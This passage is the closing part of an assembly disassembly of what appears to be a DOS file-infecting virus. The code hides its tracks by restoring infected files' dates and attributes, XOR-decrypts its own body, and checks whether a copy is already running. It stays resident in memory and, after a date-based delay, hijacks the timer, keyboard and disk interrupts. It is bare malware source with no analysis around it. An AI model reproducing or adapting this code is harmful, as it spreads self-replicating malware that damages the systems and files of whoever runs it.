		mov	bx,cs:data_33e		; (6C23:0028=0)
		mov	dx,cs:data_35e		; (6C23:002C=0)
		mov	cx,cs:data_36e		; (6C23:002E=0)
		mov	ax,5701h
		int	21h			; DOS Services  ah=function 57h
						;  get/set file date & time
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		lds	dx,dword ptr cs:data_31e	; (6C23:0024=0) Load 32 bit ptr
		mov	cx,cs:data_34e		; (6C23:002A=0)
		mov	ax,4301h
		int	21h			; DOS Services  ah=function 43h
						;  get/set file attrb, nam@ds:dx
		lds	dx,dword ptr cs:data_42e	; (6C23:003C=0) Load 32 bit ptr
		mov	ax,2524h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
loc_59:
		pop	es
		pop	ds
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		popf				; Pop flags
		jmp	dword ptr cs:data_41e	; (6C23:0038=0)
  
;==========================================================================
;			       SUBROUTINE
;==========================================================================
  
sub_4		proc	near
		push	ds
		push	es
		push	di
		push	si
		push	cx
		push	ax
		push	cs
		pop	es
		push	cs
		pop	ds
		mov	si,6Bh
		mov	di,si
		mov	cx,0B6h
		mov	ah,ds:data_24e		; (6C23:0005=0)
  
locloop_60:
		lodsb				; String [si] to al
		xor	al,ah
		stosb				; Store al to es:[di]
		loop	locloop_60		; Loop if cx > 0
  
		pop	ax
		pop	cx
		pop	si
		pop	di
		pop	es
		pop	ds
		retn
sub_4		endp
  
  
;==========================================================================
;			       SUBROUTINE
;==========================================================================
  
sub_5		proc	near
		xor	ax,ax			; Zero register
		mov	bx,ax
		mov	dx,ax
		mov	si,ax
		mov	di,ax
		retn
sub_5		endp
  
loc_61:
		cld				; Clear direction
		mov	ax,4B40h
		int	21h			; DOS Services  ah=function 4Bh
						;  run progm @ds:dx, parm @es:bx
		cmp	ax,5678h
		jne	loc_62			; Jump if not equal
		mov	ax,4B41h
		mov	di,100h
		mov	si,0BC4h
		add	si,di
		mov	cx,cs:[di+32h]
		nop				;*Fixup for MASM (M)
		int	21h			; DOS Services  ah=function 4Bh
						;  run progm @ds:dx, parm @es:bx
loc_62:
		mov	ax,cs
		add	ax,10h
		mov	ss,ax
		mov	sp,0BB4h
		push	ax
		mov	ax,900h
		push	ax
		retf				; Return far
		db	0FCh, 6, 2Eh, 8Ch, 6, 40h
		db	0, 2Eh, 8Ch, 6, 8Eh, 0
		db	2Eh, 8Ch, 6, 92h, 0, 2Eh
		db	8Ch, 6, 96h, 0, 8Ch, 0C0h
		db	5, 10h, 0, 2Eh, 1, 6
		db	1Eh, 0, 2Eh, 1, 6, 1Ah
		db	0, 0B8h, 40h, 4Bh, 0CDh, 21h
		db	3Dh, 78h, 56h, 75h, 13h, 7
		db	2Eh, 8Eh, 16h, 1Ah, 0, 2Eh
		db	8Bh, 26h, 18h, 0, 0E8h, 8Bh
		db	0FFh, 2Eh, 0FFh, 2Eh, 1Ch, 0
		db	0E8h, 60h, 0FFh, 0B4h, 0, 0CDh
		db	1Ah, 8Bh, 0DAh
loc_63:
		int	1Ah			; Real time clock   ah=func 00h
						;  get system timer count cx,dx
		cmp	bx,dx
		je	loc_63			; Jump if equal
		xor	si,si			; Zero register
		mov	bx,dx
loc_64:
		int	1Ah			; Real time clock   ah=func 00h
						;  get system timer count cx,dx
		inc	si
		cmp	bx,dx
		je	loc_64			; Jump if equal
		mov	word ptr cs:data_48e,0A000h	; (6C23:0064=0)
		mov	bx,si
		sub	bx,50h
		cmp	bx,0A00h
		jae	loc_65			; Jump if above or =
		mov	cl,4
		shl	bx,cl			; Shift w/zeros fill
		mov	cs:data_48e,bx		; (6C23:0064=0)
loc_65:
		xor	ax,ax			; Zero register
		mov	es,ax
		mov	ax,es:data_1e		; (0000:03FC=0F000h)
		mov	cs:data_44e,ax		; (6C23:0042=0)
		mov	al,es:data_2e		; (0000:03FE=16h)
		mov	cs:data_45e,al		; (6C23:0044=0)
		mov	word ptr es:data_1e,0A5F3h	; (0000:03FC=0F000h)
		mov	byte ptr es:data_2e,0CBh	; (0000:03FE=16h)
		pop	ax
		add	ax,10h
		mov	es,ax
		push	cs
		pop	ds
		mov	cx,0BC4h
		shr	cx,1			; Shift w/zeros fill
		xor	si,si			; Zero register
		mov	di,si
		push	es
		mov	ax,9B3h
		push	ax
;*		jmp	far ptr loc_1		;*(0000:03FC)
		db	0EAh, 0FCh, 3, 0, 0
		db	8Ch, 0C8h, 8Eh, 0D0h, 0BCh, 0B4h
		db	0Bh, 33h, 0C0h, 8Eh, 0D8h, 2Eh
		db	0A1h, 42h, 0, 0A3h, 0FCh, 3
		db	2Eh, 0A0h, 44h, 0, 0A2h, 0FEh
		db	3, 8Bh, 0DCh, 0B1h, 4, 0D3h
		db	0EBh, 83h, 0C3h, 20h, 0B4h, 4Ah
		db	2Eh, 8Eh, 6, 40h, 0, 0CDh
		db	21h, 0B8h, 21h, 35h, 0CDh, 21h
		db	2Eh, 89h, 1Eh, 38h, 0, 2Eh
		db	8Ch, 6, 3Ah, 0, 0Eh, 1Fh
		db	0BAh, 11h, 5, 0B8h, 21h, 25h
		db	0CDh, 21h, 8Eh, 6, 40h, 0
		db	26h, 8Eh, 6, 2Ch, 0, 33h
		db	0FFh, 0B9h, 0FFh, 7Fh, 32h, 0C0h
  
locloop_66:
		repne	scasb			; Rep zf=0+cx >0 Scan es:[di] for al
		cmp	es:[di],al
		loopnz	locloop_66		; Loop if zf=0, cx>0
  
		mov	dx,di
		add	dx,3
		mov	ax,4B00h
		push	es
		pop	ds
		push	cs
		pop	es
		mov	bx,8Ah
		push	ds
		push	es
		push	ax
		push	bx
		push	cx
		push	dx
		push	cs
		pop	ds
		mov	ah,2Ah			; '*'
		int	21h			; DOS Services  ah=function 2Ah
						;  get date, cx=year, dx=mon/day
		sub	cx,7BCh
		mov	ax,cx
		mov	bx,dx
		mov	cx,168h
		mul	cx			; dx:ax = reg * ax
		xchg	ax,bx
		add	bl,al
		adc	bh,0
		mov	al,ah
		mov	cl,1Eh
		mul	cl			; ax = reg * al
		add	ax,bx
		sub	ax,ds:data_37e		; (6C23:0030=0)
		ja	loc_67			; Jump if above
		jmp	loc_70			; (0BD0)
loc_67:
		add	ds:data_37e,ax		; (6C23:0030=0)
		cmp	ax,7
		ja	loc_68			; Jump if above
		jmp	short loc_70		; (0BD0)
		db	90h
loc_68:
		mov	ax,3508h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	ds:data_39e,bx		; (6C23:0034=0)
		mov	word ptr ds:data_39e+2,es	; (6C23:0036=0)
		push	cs
		pop	ds
		mov	ah,2Ch			; ','
		int	21h			; DOS Services  ah=function 2Ch
						;  get time, cx=hrs/min, dh=sec
		mov	cl,dh
		and	cl,1
		cmp	cl,0
		mov	dx,2AEh
		mov	byte ptr ds:data_51e,0	; (6C23:0069=0)
		jnz	loc_69			; Jump if not zero
		mov	dx,2D2h
		mov	byte ptr ds:data_51e,1	; (6C23:0069=0)
loc_69:
		mov	word ptr ds:data_23e,1	; (6C23:0003=0)
		mov	data_54,0		; (6C23:0122=0)
		mov	data_53,1		; (6C23:0121=2)
		mov	byte ptr ds:data_50e,0	; (6C23:0068=0)
		mov	byte ptr ds:data_52e,0	; (6C23:006A=0)
		mov	ax,2508h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		mov	ax,3509h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	ds:data_25e,bx		; (6C23:0006=0)
		mov	word ptr ds:data_25e+2,es	; (6C23:0008=0)
		mov	dx,35Dh
		mov	ax,2509h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
		mov	ax,3513h
		int	21h			; DOS Services  ah=function 35h
						;  get intrpt vector al in es:bx
		mov	ds:data_27e,bx		; (6C23:000A=0)
		mov	word ptr ds:data_27e+2,es	; (6C23:000C=0)
		mov	dx,4EFh
		mov	ax,2513h
		int	21h			; DOS Services  ah=function 25h
						;  set intrpt vector al to ds:dx
loc_70:
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		pop	es
		pop	ds
		pushf				; Push flags
		call	dword ptr cs:data_41e	; (6C23:0038=0)
		push	ds
		pop	es
		mov	ah,49h			; 'I'
		int	21h			; DOS Services  ah=function 49h
						;  release memory block, es=seg
		mov	ah,4Dh			; 'M'
		int	21h			; DOS Services  ah=function 4Dh
						;  get return code info in ax
		mov	ah,31h			; '1'
		mov	dx,0BC4h
		mov	cl,4
		shr	dx,cl			; Shift w/zeros fill
		add	dx,10h
		int	21h			; DOS Services  ah=function 31h
						;  terminate & stay resident
		db	154 dup (0)
		db	6Ch, 15h, 2, 2Ah, 8Ah, 0
		db	0BCh, 7, 1, 1, 0C4h, 0Bh
		db	6Ch, 15h, 73h, 12h, 0F4h, 2
		db	4, 7Fh, 0CCh, 0, 0C4h, 0Bh
		db	1Dh, 0, 0, 0, 6Fh, 12h
		db	0AFh, 0Eh, 0F4h, 0Ah, 73h, 12h
		db	6, 0F2h, 82h, 0F0h, 0EBh, 6Fh
		db	66h, 2, 0EBh, 6Fh, 57h, 9
		db	0, 70h, 5Ah, 0, 0, 0C0h
		db	7Ch, 90h
		db	20 dup (90h)
		db	0CDh, 21h
  
seg_a		ends
  
  
  
		end	start
